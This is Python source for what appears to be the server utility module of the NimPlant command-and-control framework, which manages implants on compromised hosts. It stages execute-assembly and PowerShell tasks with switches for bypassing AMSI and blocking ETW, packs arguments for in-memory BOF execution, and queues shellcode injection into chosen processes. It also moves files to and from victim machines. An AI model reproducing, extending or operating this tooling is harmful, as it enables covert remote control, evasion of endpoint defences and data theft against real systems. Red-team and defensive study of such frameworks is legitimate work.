from datetime import datetime
from struct import pack, calcsize
from time import sleep
from zlib import compress
import base64
import os, hashlib, json, sys

# Clear screen
def cls():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


# Timestamp function
timestampFormat = "%d/%m/%Y %H:%M:%S"


def timestamp():
    return datetime.now().strftime(timestampFormat)


# Loop to check for late checkins (can be infinite - runs as separate thread)
def periodicNimplantChecks():
    from .nimplant import np_server

    while True:
        np_server.checkLateNimplants()
        sleep(5)


# Log input and output to flat files per session
def log(message, target=None):
    from .nimplant import np_server

    np = np_server.getNimplantByGuid(target)

    logDir = os.path.abspath(
        os.path.join(
            os.path.dirname(sys.argv[0]), "server", ".logs", f"server-{np_server.name}"
        )
    )
    os.makedirs(logDir, exist_ok=True)

    if target is not None and np is not None:
        logFile = f"session-{np.id}-{np.guid}.log"
    else:
        logFile = f"console.log"

    logFilePath = os.path.join(logDir, logFile)
    with open(logFilePath, "a") as f:
        f.write(message + "\n")


# Print function to properly direct output
def nimplantPrint(message, target=None, task=None, taskGuid=None):
    from .db import dbNimplantLog, dbServerLog
    from .nimplant import np_server

    np = np_server.getNimplantByGuid(target)
    if target is not None and np is not None:
        # Print to nimplant stream
        result = f"\x1b[1K\r[{timestamp()}|NP{np.id}] {message}"

        if task:
            # Log to database as server-side command (write command + result instantly)
            dbNimplantLog(np, task=task, taskFriendly=task, result=message)

        elif taskGuid:
            # Log to database as result of earlier task
            dbNimplantLog(np, taskGuid=taskGuid, result=message)

        else:
            # Log to database as message without task
            dbNimplantLog(np, result=message)

    else:
        # Print to console stream
        result = f"\x1b[1K\r[{timestamp()}] {message}"
        dbServerLog(np_server, message)

    log(f"[{timestamp()}] {message}", target)
    print(result)


# Cleanly exit server
def exitServer():
    from .nimplant import np_server

    if np_server.containsActiveNimplants():
        np_server.killAllNimplants()
        nimplantPrint(
            "Waiting for all NimPlants to receive kill command... Do not force quit!"
        )
        while np_server.containsActiveNimplants():
            sleep(1)

    nimplantPrint("Exiting...")
    np_server.kill()
    os._exit(0)


# Exit wrapper for console use
def exitServerConsole():
    from .nimplant import np_server

    if np_server.containsActiveNimplants():
        check = (
            str(
                input(
                    "Are you sure you want to exit? This will kill ALL active NimPlants! (Y/N): "
                )
            )
            .lower()
            .strip()
        )
        if check[0] == "y":
            exitServer()
    else:
        exitServer()


# Pretty print function
def prettyPrint(d):
    return json.dumps(d, sort_keys=True, indent=2, default=str)


# Help menu function
def getHelpMenu():
    from .commands import getCommands

    res = "NIMPLANT HELP\n"
    res += (
        "Command arguments shown as [required] <optional>.\n"
        "Commands with (GUI) can be run without parameters via the web UI.\n\n"
    )
    for c in getCommands():
        res += f"{c['command']:<18}{c['description']:<75}\n"
    return res.rstrip()


# Print the help text for a specific command
def getCommandHelp(command):
    from .commands import getCommands

    c = [c for c in getCommands() if c["command"] == command]

    if not c:
        return "Help: Command not found."

    c = c[0]

    res = "NIMPLANT HELP\n"
    res += f"{c['command']} {c['description']}\n\n"
    res += c["help"]

    return res


# Get the server configuration as a YAML object
def getConfigJson():
    from .nimplant import np_server
    from .config import config

    res = {"GUID": np_server.guid, "Server Configuration": config}
    return json.dumps(res)


# Handle pre-processing for the 'execute-assembly' command
def executeAssembly(np, args, raw_command):
    from .crypto import encryptData

    # TODO: Make AMSI/ETW arg parsing more user-friendly
    amsi = "1"
    etw = "1"

    k = 1
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    try:
        file = args[k]
    except:
        nimplantPrint(
            "Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments>'.",
            np.guid,
            raw_command,
        )
        return

    # Check if assembly is provided as file path (normal use) or Base64 blob (GUI)
    try:
        if os.path.isfile(file):
            with open(file, "rb") as f:
                assembly = f.read()
    except:
        nimplantPrint(
            "Invalid assembly file specified.",
            np.guid,
            raw_command,
        )
        return

    assembly = compress(assembly, level=9)
    assembly = encryptData(assembly, np.cryptKey)
    assemblyArgs = " ".join(args[k + 1 :])

    commandArgs = " ".join([amsi, etw, assembly, assemblyArgs])

    command = f"execute-assembly {commandArgs}"

    guid = np.addTask(command, taskFriendly=raw_command)
    nimplantPrint(
        "Staged execute-assembly command for NimPlant.", np.guid, taskGuid=guid
    )


# Helper for packing BOF arguments
# Original source: COFFLoader by kev169 at TrustedSec
# https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py
class BeaconPack:
    def __init__(self):
        self.buffer = b""
        self.size = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addshort(self, short):
        self.buffer += pack("<h", short)
        self.size += 2

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s) + 2, s)
        self.size += calcsize(fmt)

    def addbin(self, s):
        try:
            s = base64.b64decode(s)
        except:  # not b64, try raw encoding
            if isinstance(s, str):
                s = s.encode("utf-8")

        fmt = "<L{}s".format(len(s))
        self.buffer += pack(fmt, len(s), s)
        self.size += calcsize(fmt)


# Handle pre-processing for the 'inline-execute' command
def inlineExecute(np, args, raw_command):
    from .crypto import encryptData
    import binascii

    taskFriendly = raw_command
    try:
        file = args[1]
        entryPoint = args[2]
        assemblyArgs = list(args[3:])
    except:
        nimplantPrint(
            "Invalid number of arguments received.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.",
            np.guid,
            raw_command,
        )
        return

    # Check if BOF is provided as file path (normal use) or Base64 blob (GUI)
    try:
        if os.path.isfile(file):
            with open(file, "rb") as f:
                assembly = f.read()
        else:
            assembly = base64.b64decode(file)
            taskFriendly = "inline-execute"  # Truncate big B64 blob
    except:
        nimplantPrint(
            "Invalid BOF file specified.",
            np.guid,
            raw_command,
        )
        return

    assembly = compress(assembly, level=9)
    assembly = encryptData(assembly, np.cryptKey)

    # Pre-process BOF arguments
    # Check if list of arguments consists of argument-type pairs
    binaryArgTypes = ["binary", "bin", "b"]
    integerArgTypes = ["integer", "int", "i"]
    shortArgTypes = ["short", "s"]
    stringArgTypes = ["string", "z"]
    wstringArgTypes = ["wstring", "Z"]
    allArgTypes = (
        binaryArgTypes
        + integerArgTypes
        + shortArgTypes
        + stringArgTypes
        + wstringArgTypes
    )

    if len(assemblyArgs) != 0:
        if not len(assemblyArgs) % 2 == 0:
            nimplantPrint(
                "BOF arguments not provided as arg-type pairs.\n"
                "Usage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                "Example: 'inline-execute dir.x64.o go C:\\Users\\Testuser\\Desktop wstring'",
                np.guid,
                raw_command,
            )
            return

        # Pack every argument-type pair
        buffer = BeaconPack()
        argPairList = zip(assemblyArgs[::2], assemblyArgs[1::2])
        for argPair in argPairList:
            arg = argPair[0]
            argType = argPair[1]

            try:
                if argType in binaryArgTypes:
                    buffer.addbin(arg)
                elif argType in integerArgTypes:
                    buffer.addint(int(arg))
                elif argType in shortArgTypes:
                    buffer.addshort(int(arg))
                elif argType in stringArgTypes:
                    buffer.addstr(arg)
                elif argType in wstringArgTypes:
                    buffer.addWstr(arg)
                else:
                    nimplantPrint(
                        "Invalid argument type provided.\n"
                        f"Valid argument types (case-sensitive): {', '.join(allArgTypes)}.",
                        np.guid,
                        raw_command,
                    )
                    return

            except ValueError:
                nimplantPrint(
                    "Invalid integer or short value provided.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                    "Example: 'inline-execute createremotethread.x64.o go 1337 i [b64shellcode] b'",
                    np.guid,
                    raw_command,
                )
                return

        assemblyArgs_final = str(binascii.hexlify(buffer.getbuffer()), "utf-8")
    else:
        assemblyArgs_final = ""

    commandArgs = " ".join([assembly, entryPoint, assemblyArgs_final])
    command = f"inline-execute {commandArgs}"
    guid = np.addTask(command, taskFriendly=taskFriendly)
    nimplantPrint("Staged inline-execute command for NimPlant.", np.guid, taskGuid=guid)


# Handle pre-processing for the 'powershell' command
def powershell(np, args, raw_command):
    amsi = "1"
    etw = "1"

    k = 1
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    powershellCmd = " ".join(args[k:])

    if powershellCmd == "":
        nimplantPrint(
            "Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.",
            np.guid,
            raw_command,
        )
        return

    commandArgs = " ".join([amsi, etw, powershellCmd])

    command = f"powershell {commandArgs}"

    guid = np.addTask(command, taskFriendly=raw_command)
    nimplantPrint("Staged powershell command for NimPlant.", np.guid, taskGuid=guid)


# Handle pre-processing for the 'shinject' command
def shinject(np, args, raw_command):
    from .crypto import encryptData

    try:
        processId, filePath = args[1:3]
    except:
        nimplantPrint(
            "Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'.",
            np.guid,
            raw_command,
        )
        return

    if os.path.isfile(filePath):
        with open(filePath, "rb") as f:
            shellcode = f.read()

        shellcode = compress(shellcode, level=9)
        shellcode = encryptData(shellcode, np.cryptKey)

        commandArgs = " ".join([processId, shellcode])

        command = f"shinject {commandArgs}"

        guid = np.addTask(command, taskFriendly=raw_command)
        nimplantPrint("Staged shinject command for NimPlant.", np.guid, taskGuid=guid)

    else:
        nimplantPrint(
            "Shellcode file to inject does not exist.",
            np.guid,
            raw_command,
        )


# Handle pre-processing for the 'upload' command
def uploadFile(np, args, raw_command):
    if len(args) == 2:
        filePath = args[1]
        remotePath = ""
    elif len(args) == 3:
        filePath = args[1]
        remotePath = args[2]
    else:
        nimplantPrint(
            "Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.",
            np.guid,
            raw_command,
        )
        return

    fileName = os.path.basename(filePath)
    fileId = hashlib.md5(filePath.encode("UTF-8")).hexdigest()

    if os.path.isfile(filePath):
        np.hostFile(filePath)
        command = f"upload {fileId} {fileName} {remotePath}"

        guid = np.addTask(command, taskFriendly=raw_command)
        nimplantPrint("Staged upload command for NimPlant.", np.guid, taskGuid=guid)

    else:
        nimplantPrint("File to upload does not exist.", np.guid, raw_command)


# Handle pre-processing for the 'download' command
def downloadFile(np, args, raw_command):
    from .nimplant import np_server

    if len(args) == 2:
        filePath = args[1]
        fileName = filePath.replace("/", "\\").split("\\")[-1]
        localPath = f"server/downloads/server-{np_server.guid}/{fileName}"
    elif len(args) == 3:
        filePath = args[1]
        localPath = args[2]
    else:
        nimplantPrint(
            "Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.",
            np.guid,
            raw_command,
        )
        return

    os.makedirs(os.path.dirname(localPath), exist_ok=True)
    np.receiveFile(localPath)
    command = f"download {filePath}"

    guid = np.addTask(command, taskFriendly=raw_command)
    nimplantPrint("Staged download command for NimPlant.", np.guid, taskGuid=guid)


# Get last lines of file
# Credit 'S.Lott' on StackOverflow: https://stackoverflow.com/questions/136168/get-last-n-lines-of-a-file-similar-to-tail
def tail(f, lines):
    total_lines_wanted = lines
    BLOCK_SIZE = 1024
    f.seek(0, 2)
    block_end_byte = f.tell()
    lines_to_go = total_lines_wanted
    block_number = -1
    blocks = []
    while lines_to_go > 0 and block_end_byte > 0:
        if block_end_byte - BLOCK_SIZE > 0:
            f.seek(block_number * BLOCK_SIZE, 2)
            blocks.append(f.read(BLOCK_SIZE))
        else:
            f.seek(0, 0)
            blocks.append(f.read(block_end_byte))
        lines_found = blocks[-1].count(b"\n")
        lines_to_go -= lines_found
        block_end_byte -= BLOCK_SIZE
        block_number -= 1
    all_read_text = b"".join(reversed(blocks))
    return b"\n".join(all_read_text.splitlines()[-total_lines_wanted:])


def tailNimPlantLog(np=None, lines=100):
    from .nimplant import np_server

    logDir = os.path.abspath(
        os.path.join(
            os.path.dirname(sys.argv[0]), "server", ".logs", f"server-{np_server.name}"
        )
    )

    if np:
        logFile = f"session-{np.id}-{np.guid}.log"
        id = np.guid
    else:
        logFile = f"console.log"
        id = "CONSOLE"

    logFilePath = os.path.join(logDir, logFile)

    if os.path.exists(logFilePath):
        with open(logFilePath, "rb") as f:
            logContents = tail(f, lines).decode("utf8")
    else:
        lines = 0
        logContents = ""

    return {"id": id, "lines": lines, "result": logContents}
